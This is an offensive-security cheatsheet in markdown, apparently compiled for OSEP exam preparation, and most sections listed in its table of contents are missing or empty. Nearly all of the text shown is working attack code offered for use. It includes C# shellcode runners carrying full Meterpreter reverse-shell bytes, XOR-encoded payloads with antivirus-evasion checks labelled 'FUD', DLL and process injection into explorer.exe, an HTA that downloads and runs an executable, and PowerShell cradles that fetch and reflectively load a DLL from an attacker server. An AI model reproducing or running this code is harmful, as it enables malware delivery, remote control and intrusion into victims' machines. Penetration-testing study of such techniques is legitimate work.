# OSEP Cheatsheet
#### purg3
Under Construction
***
A cheatsheet compiled so you have everything you need in one place. I'd like to say thank you to all the authors of the repo's listed here, without you this would not exist.
# Table of Contents

## [DotnetToJScript](#DotNetToJscript-1)

## [CSharp](#CSharp-1)

- [FUD_.NET](FUD_.NET)
- [Meterpreter_FUD_DLL](#Meterpreter_FUD_DLL)
- [DLL_Injection](#DLL_Injection)
- [Shellcode_Runner](#Shellcode_Runner)
- [Process_injection](#Process_injection)
- [SharpLoader](#SharpLoader)

## [Javascript](#Javascript-1)

- [Download&Execute](#DownloadExecute)

## [Phishing](#Phishing-1)

## [Powershell](#Powershell-1)

- [Download_file](#Download_file)
- [Powershell_Cradle](#Powershell_Cradle)
- [Constrained_lang_mode](#Constrained_lang_mode)
- [CLM_Bypass](#CLM_Bypass)
- [Disable_Restricted_Admin](#Disable_Restricted_Admin)
- [Disable_AMSI](#Disable_AMSI)
- [Load_assembly_reflectively](#Load_assembly_reflectively)

## [Active_Directory](#Active_Directory-1)

## [Windows](#Windows-1)

## [Linux](#Linux-1)

## [Impacket](#Impacket-1)

## [TortugaToolKit](#TortugaToolKit-1)

## [PowerUpSQL](#PowerUpSQL-1)

## [MimiKatz](#MimiKatz-1)

## [Rubeus](#Rubeus-1)

## [Metasploit](#Metasploit-1)

## [Tools](#Tools-1)

***
# DotNetToJscript

## Replace testclass.cs with following code and replace shellcode

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
[ComVisible(true)]
public class TestClass
{
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr
lpThreadId);
[DllImport("kernel32.dll")]
static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32dwMilliseconds);
public TestClass()
{
	byte[] buf = new byte[626] {
		0xfc,0x48,0x83,0xe4,0xf0,0xe8...
	int size = buf.Length;
	IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
	Marshal.Copy(buf, 0, addr, size);
	IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,IntPtr.Zero, 0,
IntPtr.Zero);
```
<br>

## **Build JS**
```
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
```
<br>

## **Create HTA file**

#### Method 1:
```javascript
<head>
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("powershell iwr -uri http://IP:PORT/file.exe -outfile
C:\\path\\to\\file.exe;C:\\path\\to\\file.exe");
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
```

<br>
<br>

# CSharp

<br>
<br>

## **FUD_.NET**
***
<br>

 #### 1. Generate shellcode
 #### 2. XOR Shellcode
 #### 3. Place XOR shellcode into Runner
 #### 4. Execute = D
 
 - Modify however you want, keep'em guessing ; )

<br>

### **XOR**
***
```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Helper
{
    class Program
    {
static void Main(string[] args)
    {
    //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.XX.XX LPORT=443 -f csharp

    byte[] buf = new byte[510] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x51,0x48,0x8b,0x52,0x18,0x56,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0x0f,0xb7,0x4a,0x4a,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,
0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x4d,
0x31,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,
0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,
0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00,
0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,
0x49,0xbc,0x02,0x00,0x0d,0x05,0xc0,0xa8,0x01,0x26,0x41,0x54,0x49,0x89,0xe4,
0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,
0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,
0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,
0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,
0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,
0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,0x75,0xe5,
0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,
0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,
0x83,0xf8,0x00,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,
0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,
0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31,
0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,
0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,
0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,0xff,0xd5,
0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c,
0xff,0xff,0xff,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,
0xff,0xe7,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };
    
    
    byte[] encoded = new byte[buf.Length];
    for (int i = 0; i < buf.Length; i++)
    
    {
    encoded[i] = (byte)(((uint)buf[i] + 2) & 0xff);
    }

    StringBuilder hex = new StringBuilder(encoded.Length * 2);
    foreach (byte b in encoded)

    {
    hex.AppendFormat("0x{0:x2}, ", b);
    }

    Console.WriteLine("The payload is: " + hex.ToString());
    Console.WriteLine("Length was: " + buf.Length.ToString());
    }
    }
}
```

<br>

### **Runner**
***

```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace Met
{
    class Program
    {
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();
    static void Main(string[] args)
    {

        //Sleep timer bypass
        DateTime t1 = DateTime.Now;
        Sleep(2000);
        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
        if (t2 < 1.5) {
            return;
        }
        Console.WriteLine("Sleep timer bypassed!");

        //Non emulated api's
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if (mem == null) {
            return;

        }
        Console.WriteLine("API Emulation done!");
        byte[] buf = new byte[770] { };
    
        byte[] encoded = new byte[buf.Length];
        for (int i = 0; i < buf.Length; i++)
        
        {
        encoded[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
        }
        buf = encoded;
        Console.WriteLine("Cipher decrypted!");
        int size = buf.Length;
        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
        Console.WriteLine("Allocation Complete!");
        Marshal.Copy(buf, 0, addr, size);
        Console.WriteLine("Copy done!");
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        Console.WriteLine("Thread Created");
        WaitForSingleObject(hThread, 0xFFFFFFFF);
        Console.WriteLine("Reached End");
    }
    }
}
```

<br>
<br>

## Meterpreter_FUD_DLL

### Create msfvenom shellcode

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.36 LPORT=3333 -f csharp 
```

### Place shellcode in and run

```csharp
using System;
using System.Text;

namespace XOR_encoder
{
    class Program
    {
        static void Main(string[] args)
        {
            // Msfvenom shellcode here
            byte[] buf = new byte[560] {
            0xeb,0x27,0x5b,0x53,0x5f,0xb0,0x49,0xfc,0xae,0x75,0xfd,0x57,0x59,0x53,0x5e,
            0x8a,0x06,0x30,0x07,0x48,0xff,0xc7,0x48,0xff,0xc6,0x66,0x81,0x3f,0xd1,0xca,
            0x74,0x07,0x80,0x3e,0x49,0x75,0xea,0xeb,0xe6,0xff,0xe1,0xe8,0xd4,0xff,0xff,
            0xff,0x13,0x49,0xef,0x5b,0x90,0xf7,0xe3,0xfb,0xdf,0x13,0x13,0x13,0x52,0x42,
            0x52,0x43,0x41,0x42,0x5b,0x22,0xc1,0x45,0x76,0x5b,0x98,0x41,0x73,0x5b,0x98,
            0x41,0x0b,0x5b,0x98,0x41,0x33,0x5e,0x22,0xda,0x5b,0x98,0x61,0x43,0x5b,0x1c,
            0xa4,0x59,0x59,0x5b,0x22,0xd3,0xbf,0x2f,0x72,0x6f,0x11,0x3f,0x33,0x52,0xd2,
            0xda,0x1e,0x52,0x12,0xd2,0xf1,0xfe,0x41,0x5b,0x98,0x41,0x33,0x98,0x51,0x2f,
            0x5b,0x12,0xc3,0x52,0x42,0x75,0x92,0x6b,0x0b,0x18,0x11,0x1c,0x96,0x61,0x13,
            0x13,0x13,0x98,0x93,0x9b,0x13,0x13,0x13,0x5b,0x96,0xd3,0x67,0x74,0x5b,0x12,
            0xc3,0x43,0x98,0x5b,0x0b,0x57,0x98,0x53,0x33,0x5a,0x12,0xc3,0xf0,0x45,0x5b,
            0xec,0xda,0x5e,0x22,0xda,0x52,0x98,0x27,0x9b,0x5b,0x12,0xc5,0x5b,0x22,0xd3,
            0xbf,0x52,0xd2,0xda,0x1e,0x52,0x12,0xd2,0x2b,0xf3,0x66,0xe2,0x5f,0x10,0x5f,
            0x37,0x1b,0x56,0x2a,0xc2,0x66,0xcb,0x4b,0x57,0x98,0x53,0x37,0x5a,0x12,0xc3,
            0x75,0x52,0x98,0x1f,0x5b,0x57,0x98,0x53,0x0f,0x5a,0x12,0xc3,0x52,0x98,0x17,
            0x9b,0x5b,0x12,0xc3,0x52,0x4b,0x52,0x4b,0x4d,0x4a,0x49,0x52,0x4b,0x52,0x4a,
            0x52,0x49,0x5b,0x90,0xff,0x33,0x52,0x41,0xec,0xf3,0x4b,0x52,0x4a,0x49,0x5b,
            0x98,0x01,0xfa,0x58,0xec,0xec,0xec,0x4e,0x5a,0xad,0x64,0x60,0x21,0x4c,0x20,
            0x21,0x13,0x13,0x52,0x45,0x5a,0x9a,0xf5,0x5b,0x92,0xff,0xb3,0x12,0x13,0x13,
            0x5a,0x9a,0xf6,0x5a,0xaf,0x11,0x13,0x1e,0x16,0xd3,0xbb,0x12,0x37,0x52,0x47,
            0x5a,0x9a,0xf7,0x5f,0x9a,0xe2,0x52,0xa9,0x5f,0x64,0x35,0x14,0xec,0xc6,0x5f,
            0x9a,0xf9,0x7b,0x12,0x12,0x13,0x13,0x4a,0x52,0xa9,0x3a,0x93,0x78,0x13,0xec,
            0xc6,0x79,0x19,0x52,0x4d,0x43,0x43,0x5e,0x22,0xda,0x5e,0x22,0xd3,0x5b,0xec,
            0xd3,0x5b,0x9a,0xd1,0x5b,0xec,0xd3,0x5b,0x9a,0xd2,0x52,0xa9,0xf9,0x1c,0xcc,
            0xf3,0xec,0xc6,0x5b,0x9a,0xd4,0x79,0x03,0x52,0x4b,0x5f,0x9a,0xf1,0x5b,0x9a,
            0xea,0x52,0xa9,0x8a,0xb6,0x67,0x72,0xec,0xc6,0x96,0xd3,0x67,0x19,0x5a,0xec,
            0xdd,0x66,0xf6,0xfb,0x80,0x13,0x13,0x13,0x5b,0x90,0xff,0x03,0x5b,0x9a,0xf1,
            0x5e,0x22,0xda,0x79,0x17,0x52,0x4b,0x5b,0x9a,0xea,0x52,0xa9,0x11,0xca,0xdb,
            0x4c,0xec,0xc6,0x90,0xeb,0x13,0x6d,0x46,0x5b,0x90,0xd7,0x33,0x4d,0x9a,0xe5,
            0x79,0x53,0x52,0x4a,0x7b,0x13,0x03,0x13,0x13,0x52,0x4b,0x5b,0x9a,0xe1,0x5b,
            0x22,0xda,0x52,0xa9,0x4b,0xb7,0x40,0xf6,0xec,0xc6,0x5b,0x9a,0xd0,0x5a,0x9a,
            0xd4,0x5e,0x22,0xda,0x5a,0x9a,0xe3,0x5b,0x9a,0xc9,0x5b,0x9a,0xea,0x52,0xa9,
            0x11,0xca,0xdb,0x4c,0xec,0xc6,0x90,0xeb,0x13,0x6e,0x3b,0x4b,0x52,0x44,0x4a,
            0x7b,0x13,0x53,0x13,0x13,0x52,0x4b,0x79,0x13,0x49,0x52,0xa9,0x18,0x3c,0x1c,
            0x23,0xec,0xc6,0x44,0x4a,0x52,0xa9,0x66,0x7d,0x5e,0x72,0xec,0xc6,0x5a,0xec,
            0xdd,0xfa,0x2f,0xec,0xec,0xec,0x5b,0x12,0xd0,0x5b,0x3a,0xd5,0x5b,0x96,0xe5,
            0x66,0xa7,0x52,0xec,0xf4,0x4b,0x79,0x13,0x4a,0x5a,0xd4,0xd1,0xe3,0xa6,0xb1,
            0x45,0xec,0xc6,0xd1,0xca };

            // Array holding encrypted shellcode
            byte[] encoded =  new byte[buf.Length];

            // loop to iterate the bytes and XOR
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] ^ 0xAA) & 0xFF);
            }

            //Convert the byte array to a string
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                // 0: hex format, x2 indicates 2 bytes
                hex.AppendFormat("0x{0:x2},", b);
            }

            Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}
```

<br>

### Copy XOR shellcode and place into 

```csharp
using System;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
    public class Class1
    {


        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        public static void runner()
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            byte[] buf = new byte[560] { 0x41, 0x8d, 0xf1, 0xf9, 0xf5, 0x1a, 0xe3, 0x56, 0x04, 0xdf, 0x57, 0xfd, 0xf3, 0xf9, 0xf4, 0x20, 0xac, 0x9a, 0xad, 0xe2, 0x55, 0x6d, 0xe2, 0x55, 0x6c, 0xcc, 0x2b, 0x95, 0x7b, 0x60, 0xde, 0xad, 0x2a, 0x94, 0xe3, 0xdf, 0x40, 0x41, 0x4c, 0x55, 0x4b, 0x42, 0x7e, 0x55, 0x55, 0x55, 0xb9, 0xe3, 0x45, 0xf1, 0x3a, 0x5d, 0x49, 0x51, 0x75, 0xb9, 0xb9, 0xb9, 0xf8, 0xe8, 0xf8, 0xe9, 0xeb, 0xe8, 0xf1, 0x88, 0x6b, 0xef, 0xdc, 0xf1, 0x32, 0xeb, 0xd9, 0xf1, 0x32, 0xeb, 0xa1, 0xf1, 0x32, 0xeb, 0x99, 0xf4, 0x88, 0x70, 0xf1, 0x32, 0xcb, 0xe9, 0xf1, 0xb6, 0x0e, 0xf3, 0xf3, 0xf1, 0x88, 0x79, 0x15, 0x85, 0xd8, 0xc5, 0xbb, 0x95, 0x99, 0xf8, 0x78, 0x70, 0xb4, 0xf8, 0xb8, 0x78, 0x5b, 0x54, 0xeb, 0xf1, 0x32, 0xeb, 0x99, 0x32, 0xfb, 0x85, 0xf1, 0xb8, 0x69, 0xf8, 0xe8, 0xdf, 0x38, 0xc1, 0xa1, 0xb2, 0xbb, 0xb6, 0x3c, 0xcb, 0xb9, 0xb9, 0xb9, 0x32, 0x39, 0x31, 0xb9, 0xb9, 0xb9, 0xf1, 0x3c, 0x79, 0xcd, 0xde, 0xf1, 0xb8, 0x69, 0xe9, 0x32, 0xf1, 0xa1, 0xfd, 0x32, 0xf9, 0x99, 0xf0, 0xb8, 0x69, 0x5a, 0xef, 0xf1, 0x46, 0x70, 0xf4, 0x88, 0x70, 0xf8, 0x32, 0x8d, 0x31, 0xf1, 0xb8, 0x6f, 0xf1, 0x88, 0x79, 0x15, 0xf8, 0x78, 0x70, 0xb4, 0xf8, 0xb8, 0x78, 0x81, 0x59, 0xcc, 0x48, 0xf5, 0xba, 0xf5, 0x9d, 0xb1, 0xfc, 0x80, 0x68, 0xcc, 0x61, 0xe1, 0xfd, 0x32, 0xf9, 0x9d, 0xf0, 0xb8, 0x69, 0xdf, 0xf8, 0x32, 0xb5, 0xf1, 0xfd, 0x32, 0xf9, 0xa5, 0xf0, 0xb8, 0x69, 0xf8, 0x32, 0xbd, 0x31, 0xf1, 0xb8, 0x69, 0xf8, 0xe1, 0xf8, 0xe1, 0xe7, 0xe0, 0xe3, 0xf8, 0xe1, 0xf8, 0xe0, 0xf8, 0xe3, 0xf1, 0x3a, 0x55, 0x99, 0xf8, 0xeb, 0x46, 0x59, 0xe1, 0xf8, 0xe0, 0xe3, 0xf1, 0x32, 0xab, 0x50, 0xf2, 0x46, 0x46, 0x46, 0xe4, 0xf0, 0x07, 0xce, 0xca, 0x8b, 0xe6, 0x8a, 0x8b, 0xb9, 0xb9, 0xf8, 0xef, 0xf0, 0x30, 0x5f, 0xf1, 0x38, 0x55, 0x19, 0xb8, 0xb9, 0xb9, 0xf0, 0x30, 0x5c, 0xf0, 0x05, 0xbb, 0xb9, 0xb4, 0xbc, 0x79, 0x11, 0xb8, 0x9d, 0xf8, 0xed, 0xf0, 0x30, 0x5d, 0xf5, 0x30, 0x48, 0xf8, 0x03, 0xf5, 0xce, 0x9f, 0xbe, 0x46, 0x6c, 0xf5, 0x30, 0x53, 0xd1, 0xb8, 0xb8, 0xb9, 0xb9, 0xe0, 0xf8, 0x03, 0x90, 0x39, 0xd2, 0xb9, 0x46, 0x6c, 0xd3, 0xb3, 0xf8, 0xe7, 0xe9, 0xe9, 0xf4, 0x88, 0x70, 0xf4, 0x88, 0x79, 0xf1, 0x46, 0x79, 0xf1, 0x30, 0x7b, 0xf1, 0x46, 0x79, 0xf1, 0x30, 0x78, 0xf8, 0x03, 0x53, 0xb6, 0x66, 0x59, 0x46, 0x6c, 0xf1, 0x30, 0x7e, 0xd3, 0xa9, 0xf8, 0xe1, 0xf5, 0x30, 0x5b, 0xf1, 0x30, 0x40, 0xf8, 0x03, 0x20, 0x1c, 0xcd, 0xd8, 0x46, 0x6c, 0x3c, 0x79, 0xcd, 0xb3, 0xf0, 0x46, 0x77, 0xcc, 0x5c, 0x51, 0x2a, 0xb9, 0xb9, 0xb9, 0xf1, 0x3a, 0x55, 0xa9, 0xf1, 0x30, 0x5b, 0xf4, 0x88, 0x70, 0xd3, 0xbd, 0xf8, 0xe1, 0xf1, 0x30, 0x40, 0xf8, 0x03, 0xbb, 0x60, 0x71, 0xe6, 0x46, 0x6c, 0x3a, 0x41, 0xb9, 0xc7, 0xec, 0xf1, 0x3a, 0x7d, 0x99, 0xe7, 0x30, 0x4f, 0xd3, 0xf9, 0xf8, 0xe0, 0xd1, 0xb9, 0xa9, 0xb9, 0xb9, 0xf8, 0xe1, 0xf1, 0x30, 0x4b, 0xf1, 0x88, 0x70, 0xf8, 0x03, 0xe1, 0x1d, 0xea, 0x5c, 0x46, 0x6c, 0xf1, 0x30, 0x7a, 0xf0, 0x30, 0x7e, 0xf4, 0x88, 0x70, 0xf0, 0x30, 0x49, 0xf1, 0x30, 0x63, 0xf1, 0x30, 0x40, 0xf8, 0x03, 0xbb, 0x60, 0x71, 0xe6, 0x46, 0x6c, 0x3a, 0x41, 0xb9, 0xc4, 0x91, 0xe1, 0xf8, 0xee, 0xe0, 0xd1, 0xb9, 0xf9, 0xb9, 0xb9, 0xf8, 0xe1, 0xd3, 0xb9, 0xe3, 0xf8, 0x03, 0xb2, 0x96, 0xb6, 0x89, 0x46, 0x6c, 0xee, 0xe0, 0xf8, 0x03, 0xcc, 0xd7, 0xf4, 0xd8, 0x46, 0x6c, 0xf0, 0x46, 0x77, 0x50, 0x85, 0x46, 0x46, 0x46, 0xf1, 0xb8, 0x7a, 0xf1, 0x90, 0x7f, 0xf1, 0x3c, 0x4f, 0xcc, 0x0d, 0xf8, 0x46, 0x5e, 0xe1, 0xd3, 0xb9, 0xe0, 0xf0, 0x7e, 0x7b, 0x49, 0x0c, 0x1b, 0xef, 0x46, 0x6c, 0x7b, 0x60 };

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] ^ 0xAA) & 0xFF);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```
<br>

### Build your DLL

```
sudo csc /target:library /out:runner.dll runner.cs 
```
<br>

### Create Powershell Script to load the dll

```powershell
$data = (new-object net.webclient).downloadData('http://IP:PORT/runner.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0,$null)
```
<br>

## Host on your server
```
Host your dll file
Host your powershell script
```
<br>

### Bring it Home
```
iex(new-object net.webclient).downloadstring('http://IP:80/runner.ps1')
```
<br>
<br>

## DLL_Injection

```csharp
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true,
SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {

        String dir =
Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        String dllName = dir + "\\your.dll";

        WebClient wc = new WebClient();
        wc.DownloadFile("http://Your_Server/your.dll", dllName);

        Process[] expProc = Process.GetProcessesByName("explorer");
        int pid = expProc[0].Id;

        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
        IntPtr outSize;
        Boolean res = WriteProcessMemory(hProcess, addr,
Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"),
"LoadLibraryA");
        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib,
addr, 0, IntPtr.Zero);
        }
    }
}
```
<br>
<br>

## Shellcode_Runner

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{

        class Program
        {
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
flAllocationType, uint flProtect);

            [DllImport("kernel32.dll")]
            static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            [DllImport("kernel32.dll")]
            static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32
dwMilliseconds);

            static void Main(string[] args)
            {

                byte[] buf = new byte[YOUR_SIZE] {YOUR_SHELLCODE};

                int size = buf.Length;

                IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

                Marshal.Copy(buf, 0, addr, size);

                IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0,
IntPtr.Zero);

                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
    }
}
```
<br>
<br>

## Process_injection

```csharp
using System;
using System.Runtime.InteropServices;
namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4804);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            byte[] buf = new byte[YOUR_SIZE] {YOUR_SHELLCODE};
                IntPtr outSize;
                WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr,
IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}

```
<br>
<br>

## SharpLoader
